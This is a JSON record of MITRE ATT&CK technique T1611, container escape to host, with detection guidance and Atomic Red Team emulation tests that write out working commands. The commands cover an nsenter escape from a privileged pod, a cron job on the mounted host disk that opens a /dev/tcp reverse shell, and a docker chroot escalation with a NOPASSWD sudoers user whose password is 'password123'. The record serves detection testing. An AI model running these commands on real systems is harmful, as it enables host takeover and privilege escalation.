{
    "id": "T1611",
    "name": "Escape to Host",
    "description": "Adversaries may break out of a container to gain access to the underlying host. This can allow an adversary access to other containerized resources from the host level or to the host itself. In principle, containerized resources should provide a clear separation of application functionality and be isolated from the host environment.(Citation: Docker Overview)\nThere are multiple ways an adversary may escape to a host environment. Examples include creating a container configured to mount the host’s filesystem using the bind parameter, which allows the adversary to drop payloads and execute control utilities such as cron on the host, or utilizing a privileged container to run commands on the underlying host.(Citation: Docker Bind Mounts)(Citation: Trend Micro Privileged Container)(Citation: Intezer Doki July 20) Adversaries may also escape via [Exploitation for Privilege Escalation](T1068), such as exploiting vulnerabilities in global symbolic links in order to access the root directory of a host machine.(Citation: Windows Server Containers Are Open)\nGaining access to the host may provide the adversary with the opportunity to achieve follow-on objectives, such as establishing persistence, moving laterally within the environment, or setting up a command and control channel on the host.",
    "platforms": "Windows, Linux, Containers",
    "kill_chain_phases": "Privilege Escalation",
    "data_sources": "Container: Container Creation, Process: OS API Execution, Process: Process Creation",
    "detection": "Monitor for the deployment of suspicious or unknown container images and pods in your environment, particularly containers running as root. Additionally, monitor for unexpected usage of syscalls such as `mount` (as well as resulting process activity) that may indicate an attempt to escape from a privileged container to host. In Kubernetes, monitor for cluster-level events associated with changing containers' volume configurations.",
    "url": "https://attack.mitre.org/techniques/T1611",
    "enrichments": {
        "attack_rule_map": [],
        "cycat": {
            "cycat": {
                "cycat_related_uuids": [
                    "4a5b7ade-8bb5-4853-84ed-23f262002665"
                ],
                "lookup_results": [
                    {
                        "uuid": "4a5b7ade-8bb5-4853-84ed-23f262002665",
                        "lookup_data": {
                            "mitre-attack-id": "T1611",
                            "mitre-cti:description": "Adversaries may break out of a container to gain access to the underlying host. This can allow an adversary access to other containerized resources from the host level or to the host itself. In principle, containerized resources should provide a clear separation of application functionality and be isolated from the host environment.(Citation: Docker Overview)\n\nThere are multiple ways an adversary may escape to a host environment. Examples include creating a container configured to mount the host’s filesystem using the bind parameter, which allows the adversary to drop payloads and execute control utilities such as cron on the host; utilizing a privileged container to run commands or load a malicious kernel module on the underlying host; or abusing system calls such as `unshare` and `keyctl` to escalate privileges and steal secrets.(Citation: Docker Bind Mounts)(Citation: Trend Micro Privileged Container)(Citation: Intezer Doki July 20)(Citation: Container Escape)(Citation: Crowdstrike Kubernetes Container Escape)(Citation: Keyctl-unmask)\n\nAdditionally, an adversary may be able to exploit a compromised container with a mounted container management socket, such as `docker.sock`, to break out of the container via a [Container Administration Command](https://attack.mitre.org/techniques/T1609).(Citation: Container Escape) Adversaries may also escape via [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068), such as exploiting vulnerabilities in global symbolic links in order to access the root directory of a host machine.(Citation: Windows Server Containers Are Open)\n\nGaining access to the host may provide the adversary with the opportunity to achieve follow-on objectives, such as establishing persistence, moving laterally within the environment, or setting up a command and control channel on the host.",
                            "mitre-cti:name": "Escape to Host",
                            "mitre-cti:type": "attack-pattern",
                            "raw": "{'modified': '2022-10-21T20:03:06.707Z', 'name': 'Escape to Host', 'description': 'Adversaries may break out of a container to gain access to the underlying host. This can allow an adversary access to other containerized resources from the host level or to the host itself. In principle, containerized resources should provide a clear separation of application functionality and be isolated from the host environment.(Citation: Docker Overview)\\n\\nThere are multiple ways an adversary may escape to a host environment. Examples include creating a container configured to mount the host’s filesystem using the bind parameter, which allows the adversary to drop payloads and execute control utilities such as cron on the host; utilizing a privileged container to run commands or load a malicious kernel module on the underlying host; or abusing system calls such as `unshare` and `keyctl` to escalate privileges and steal secrets.(Citation: Docker Bind Mounts)(Citation: Trend Micro Privileged Container)(Citation: Intezer Doki July 20)(Citation: Container Escape)(Citation: Crowdstrike Kubernetes Container Escape)(Citation: Keyctl-unmask)\\n\\nAdditionally, an adversary may be able to exploit a compromised container with a mounted container management socket, such as `docker.sock`, to break out of the container via a [Container Administration Command](https://attack.mitre.org/techniques/T1609).(Citation: Container Escape) Adversaries may also escape via [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068), such as exploiting vulnerabilities in global symbolic links in order to access the root directory of a host machine.(Citation: Windows Server Containers Are Open)\\n\\nGaining access to the host may provide the adversary with the opportunity to achieve follow-on objectives, such as establishing persistence, moving laterally within the environment, or setting up a command and control channel on the host.', 'kill_chain_phases': [{'kill_chain_name': 'mitre-attack', 'phase_name': 'privilege-escalation'}], 'x_mitre_detection': \"Monitor for the deployment of suspicious or unknown container images and pods in your environment, particularly containers running as root. Additionally, monitor for unexpected usage of syscalls such as <code>mount</code> (as well as resulting process activity) that may indicate an attempt to escape from a privileged container to host. In Kubernetes, monitor for cluster-level events associated with changing containers' volume configurations.\", 'x_mitre_platforms': ['Windows', 'Linux', 'Containers'], 'x_mitre_is_subtechnique': False, 'x_mitre_deprecated': False, 'x_mitre_domains': ['enterprise-attack'], 'x_mitre_version': '1.3', 'x_mitre_contributors': ['Yuval Avrahami, Palo Alto Networks', 'Daniel Prizmant, Palo Alto Networks', 'Joas Antonio dos Santos, @C0d3Cr4zy, Inmetrics', 'Alfredo Oliveira, Trend Micro', 'David Fiser, @anu4is, Trend Micro', 'Idan Frimark, Cisco', 'Magno Logan, @magnologan, Trend Micro', 'Ariel Shuper, Cisco', 'Yossi Weizman, Azure Defender Research Team', 'Vishwas Manral, McAfee', 'CrowdStrike', 'Eran Ayalon, Cybereason', 'Oren Ofer, Cybereason', 'Ilan Sokol, Cybereason'], 'x_mitre_data_sources': ['Process: Process Creation', 'Container: Container Creation', 'Process: OS API Execution', 'Volume: Volume Modification', 'Kernel: Kernel Module Load'], 'x_mitre_permissions_required': ['Administrator', 'User', 'root'], 'type': 'attack-pattern', 'id': 'attack-pattern--4a5b7ade-8bb5-4853-84ed-23f262002665', 'created': '2021-03-30T17:38:34.277Z', 'created_by_ref': 'identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5', 'revoked': False, 'external_references': [{'source_name': 'mitre-attack', 'url': 'https://attack.mitre.org/techniques/T1611', 'external_id': 'T1611'}, {'source_name': 'Container Escape', 'description': '0xn3va. (n.d.). Escaping. Retrieved May 27, 2022.', 'url': 'https://0xn3va.gitbook.io/cheat-sheets/container/escaping'}, {'source_name': 'Windows Server Containers Are Open', 'description': \"Daniel Prizmant. (2020, July 15). Windows Server Containers Are Open, and Here's How You Can Break Out. Retrieved October 1, 2021.\", 'url': 'https://unit42.paloaltonetworks.com/windows-server-containers-vulnerabilities/'}, {'source_name': 'Docker Overview', 'description': 'Docker. (n.d.). Docker Overview. Retrieved March 30, 2021.', 'url': 'https://docs.docker.com/get-started/overview/'}, {'source_name': 'Docker Bind Mounts', 'description': 'Docker. (n.d.). Use Bind Mounts. Retrieved March 30, 2021.', 'url': 'https://docs.docker.com/storage/bind-mounts/'}, {'source_name': 'Trend Micro Privileged Container', 'description': 'Fiser, D., Oliveira, A.. (2019, December 20). Why a Privileged Container in Docker is a Bad Idea. Retrieved March 30, 2021.', 'url': 'https://www.trendmicro.com/en_us/research/19/l/why-running-a-privileged-container-in-docker-is-a-bad-idea.html'}, {'source_name': 'Intezer Doki July 20', 'description': 'Fishbein, N., Kajiloti, M.. (2020, July 28). Watch Your Containers: Doki Infecting Docker Servers in the Cloud. Retrieved March 30, 2021.', 'url': 'https://www.intezer.com/blog/cloud-security/watch-your-containers-doki-infecting-docker-servers-in-the-cloud/'}, {'source_name': 'Crowdstrike Kubernetes Container Escape', 'description': 'Manoj Ahuje. (2022, January 31). CVE-2022-0185: Kubernetes Container Escape Using Linux Kernel Exploit. Retrieved July 6, 2022.', 'url': 'https://www.crowdstrike.com/blog/cve-2022-0185-kubernetes-container-escape-using-linux-kernel-exploit/'}, {'source_name': 'Keyctl-unmask', 'description': 'Mark Manning. (2020, July 23). Keyctl-unmask: \"Going Florida\" on The State Of Containerizing Linux Keyrings. Retrieved July 6, 2022.', 'url': 'https://www.antitree.com/2020/07/keyctl-unmask-going-florida-on-the-state-of-containerizing-linux-keyrings/'}], 'object_marking_refs': ['marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168'], 'x_mitre_attack_spec_version': '2.1.0', 'x_mitre_modified_by_ref': 'identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5'}",
                            "_cycat_type": "Item"
                        }
                    }
                ]
            }
        },
        "atomics": [
            {
                "attack_technique": "T1611",
                "display_name": "Escape to Host",
                "atomic_tests": [
                    {
                        "name": "Deploy container using nsenter container escape",
                        "auto_generated_guid": "0b2f9520-a17a-4671-9dba-3bd034099fff",
                        "description": "In this escape `kubectl` is used to launch a new pod, with a container that has the host pids mapped into the container (`hostPID:true`). It uses the alpine linux container image. It runs with privilege on the host (`privileged:true`). When the container is launched the command `nsenter --mount=/proc/1/ns/mnt -- /bin/bash` is ran. Since the host processes have been mapped into the container, the container enters the host namespace, escaping the container.\n\nAdditional Details:\n- https://twitter.com/mauilion/status/1129468485480751104\n- https://securekubernetes.com/scenario_2_attack/\n",
                        "supported_platforms": [
                            "containers"
                        ],
                        "dependency_executor_name": "sh",
                        "dependencies": [
                            {
                                "description": "Verify docker is installed.",
                                "prereq_command": "which docker\n",
                                "get_prereq_command": "if [ \"\" == \"`which docker`\" ]; then echo \"Docker Not Found\"; if [ -n \"`which apt-get`\" ]; then sudo apt-get -y install docker ; elif [ -n \"`which yum`\" ]; then sudo yum -y install docker ; fi ; else echo \"Docker installed\"; fi\n"
                            },
                            {
                                "description": "Verify docker service is running.",
                                "prereq_command": "sudo systemctl status docker\n",
                                "get_prereq_command": "sudo systemctl start docker\n"
                            },
                            {
                                "description": "Verify kind is in the path.",
                                "prereq_command": "which kind\n",
                                "get_prereq_command": "curl -Lo ./kind https://kind.sigs.k8s.io/dl/v0.10.0/kind-linux-amd64\nchmod +x ./kind\nmv kind /usr/bin/kind\n"
                            },
                            {
                                "description": "Verify kind-atomic-cluster is created",
                                "prereq_command": "sudo kind get clusters\n",
                                "get_prereq_command": "sudo kind create cluster --name atomic-cluster\n"
                            },
                            {
                                "description": "Verify kubectl is in path",
                                "prereq_command": "which kubectl\n",
                                "get_prereq_command": "curl -LO \"https://dl.k8s.io/release/$(curl -L -s https://dl.k8s.io/release/stable.txt)/bin/linux/amd64/kubectl\"\nchmod +x ./kubectl\nmv kubectl /usr/bin/kubectl\n"
                            }
                        ],
                        "executor": {
                            "command": "kubectl --context kind-atomic-cluster run atomic-nsenter-escape-pod --restart=Never -ti --rm --image alpine --overrides '{\"spec\":{\"hostPID\": true, \"containers\":[{\"name\":\"1\",\"image\":\"alpine\",\"command\":[\"nsenter\",\"--mount=/proc/1/ns/mnt\",\"--\",\"/bin/bash\"],\"stdin\": true,\"tty\":true,\"securityContext\":{\"privileged\":true}}]}}'\n",
                            "name": "sh",
                            "cleanup_command": "kubectl --context kind-atomic-cluster delete pod atomic-escape-pod\n"
                        }
                    },
                    {
                        "name": "Mount host filesystem to escape privileged Docker container",
                        "auto_generated_guid": "6c499943-b098-4bc6-8d38-0956fc182984",
                        "description": "This technique abuses privileged Docker containers to mount the host's filesystem and then create a cron job to launch a reverse shell as the host's superuser.\nThe container running the test needs be privileged.  It may take up to a minute for this to run due to how often crond triggers a job.\nDev note: the echo to create cron_filename is broken up to prevent localized execution of hostname and id by Powershell. \n",
                        "supported_platforms": [
                            "containers"
                        ],
                        "input_arguments": {
                            "mount_device": {
                                "description": "Path to the device of the host's disk to mount",
                                "type": "path",
                                "default": "/dev/dm-0"
                            },
                            "mount_point": {
                                "description": "Path where the host filesystem will be mounted",
                                "type": "path",
                                "default": "/mnt/T1611.002"
                            },
                            "cron_path": {
                                "description": "Path on the host filesystem where cron jobs are stored",
                                "type": "path",
                                "default": "/etc/cron.d"
                            },
                            "cron_filename": {
                                "description": "Filename of the cron job in cron_path",
                                "type": "string",
                                "default": "T1611_002"
                            },
                            "listen_address": {
                                "description": "IP address to listen for callback from the host system.",
                                "type": "string",
                                "default": "`ifconfig eth0 | grep inet | awk '{print $2}'`"
                            },
                            "listen_port": {
                                "description": "TCP Port to listen on for callback from the host system.",
                                "type": "integer",
                                "default": 4444
                            }
                        },
                        "dependency_executor_name": "sh",
                        "dependencies": [
                            {
                                "description": "Verify mount is installed.",
                                "prereq_command": "which mount\n",
                                "get_prereq_command": "if [ \"\" == \"`which mount`\" ]; then echo \"mount Not Found\"; if [ -n \"`which apt-get`\" ]; then sudo apt-get -y install mount ; elif [ -n \"`which yum`\" ]; then sudo yum -y install mount ; fi ; else echo \"mount installed\"; fi\n"
                            },
                            {
                                "description": "Verify container is privileged.",
                                "prereq_command": "capsh --print | grep cap_sys_admin\n",
                                "get_prereq_command": "if [ \"`capsh --print | grep cap_sys_admin`\" == \"\" ]; then echo \"Container not privileged.  Re-start container in insecure state.  Docker: run with --privileged flag.  Kubectl, add securityContext: privileged: true\"; fi\n"
                            },
                            {
                                "description": "Verify mount device (/dev/dm-0) exists.",
                                "prereq_command": "ls #{mount_device}\n",
                                "get_prereq_command": "if [ ! -f #{mount_device} ]; then echo \"Container not privileged or wrong device path.  Re-start container in insecure state.  Docker: run with --privileged flag.  Kubectl, add securityContext: privileged: true\"; fi\n"
                            },
                            {
                                "description": "Netcat is installed.",
                                "prereq_command": "which netcat\n",
                                "get_prereq_command": "if [ \"\" == \"`which netcat`\" ]; then echo \"netcat Not Found\"; if [ -n \"`which apt-get`\" ]; then sudo apt-get -y install netcat ; elif [ -n \"`which yum`\" ]; then sudo yum -y install netcat ; fi\n"
                            },
                            {
                                "description": "IP Address is known.",
                                "prereq_command": "if [ \"#{listen_address}\" != \"\" ]; then echo \"Listen address set as #{listen_address}\" ; fi\n",
                                "get_prereq_command": "if [ \"\" == \"`which ifconfig`\" ]; then echo \"ifconfig Not Found\"; if [ -n \"`which apt-get`\" ]; then sudo apt-get -y install net=tools ; elif [ -n \"`which yum`\" ]; then sudo yum -y install net-tools ; fi\n"
                            }
                        ],
                        "executor": {
                            "name": "sh",
                            "elevation_required": true,
                            "command": "if [ ! -d #{mount_point} ]; then mkdir #{mount_point} ; mount #{mount_device} #{mount_point}; fi\necho -n \"* * * * * root /bin/bash -c '/bin/bash -c echo \\\"\\\"; echo \\\"hello from host! \" > #{mount_point}#{cron_path}/#{cron_filename}\necho -n \"$\" >> #{mount_point}#{cron_path}/#{cron_filename}\necho -n \"(hostname) \" >> #{mount_point}#{cron_path}/#{cron_filename}\necho -n \"$\" >> #{mount_point}#{cron_path}/#{cron_filename}\necho \"(id)\\\" >& /dev/tcp/#{listen_address}/#{listen_port} 0>&1'\" >> #{mount_point}#{cron_path}/#{cron_filename}\nnetcat -l -p #{listen_port} 2>&1\n",
                            "cleanup_command": "rm #{mount_point}#{cron_path}/#{cron_filename}\numount #{mount_point}\nrmdir #{mount_point}\n"
                        }
                    },
                    {
                        "name": "Privilege Escalation via Docker Volume Mapping",
                        "auto_generated_guid": "39fab1bc-fcb9-406f-bc2e-fe03e42ff0e4",
                        "description": "This test demonstrates privilege escalation by abusing Docker's volume mapping\nfeature to gain access to the host file system. By mounting the root directory\nof the host into a Docker container, the attacker can use chroot to operate as\nroot on the host system.\n",
                        "supported_platforms": [
                            "containers"
                        ],
                        "input_arguments": {
                            "username": {
                                "default": "docker_user",
                                "description": "Username that run attack command",
                                "type": "string"
                            }
                        },
                        "dependencies": [
                            {
                                "description": "Docker",
                                "prereq_command": "command -v docker &> /dev/null && echo \"Docker is installed\" || { echo \"Docker is not installed.\"; exit 1; }\n",
                                "get_prereq_command": "echo \"You should install docker manually.\"\n"
                            },
                            {
                                "description": "Docker Privileged User",
                                "prereq_command": "sudo -l -U #{username} | grep \"(ALL) NOPASSWD: /usr/bin/docker\"\n",
                                "get_prereq_command": "USERNAME=\"#{username}\"\nPASSWORD=\"password123\"\nSUDO_COMMAND=\"/usr/bin/docker\"\nSUDOERS_FILE=\"/etc/sudoers.d/$USERNAME\"\n[[ $EUID -ne 0 ]] && echo \"Run as root.\" && exit 1; id \"$USERNAME\" &>/dev/null || { useradd -m -s /bin/bash \"$USERNAME\" && echo \"$USERNAME:$PASSWORD\" | chpasswd; }; [[ -f \"$SUDOERS_FILE\" ]] || { echo \"$USERNAME ALL=(ALL) NOPASSWD: $SUDO_COMMAND\" > \"$SUDOERS_FILE\" && chmod 440 \"$SUDOERS_FILE\"; }; echo \"Setup complete. User: $USERNAME, Password: $PASSWORD\"\n"
                            }
                        ],
                        "executor": {
                            "name": "sh",
                            "elevation_required": true,
                            "command": "echo \"Current user: #{username}\"\nsudo -u docker_user sh -c \"sudo docker run -v /:/mnt --rm --name t1611_privesc -it alpine chroot /mnt id\"\n",
                            "cleanup_command": "USERNAME=\"#{username}\"; SUDOERS_FILE=\"/etc/sudoers.d/$USERNAME\"; id \"$USERNAME\" &>/dev/null && userdel -r \"$USERNAME\" && echo -e \"$USERNAME is deleted.\"; [[ -f \"$SUDOERS_FILE\" ]] && rm -f \"$SUDOERS_FILE\"; echo \"Cleanup complete.\"\n"
                        }
                    }
                ]
            }
        ]
    },
    "timestamp": "2025-02-28 19:03:06"
}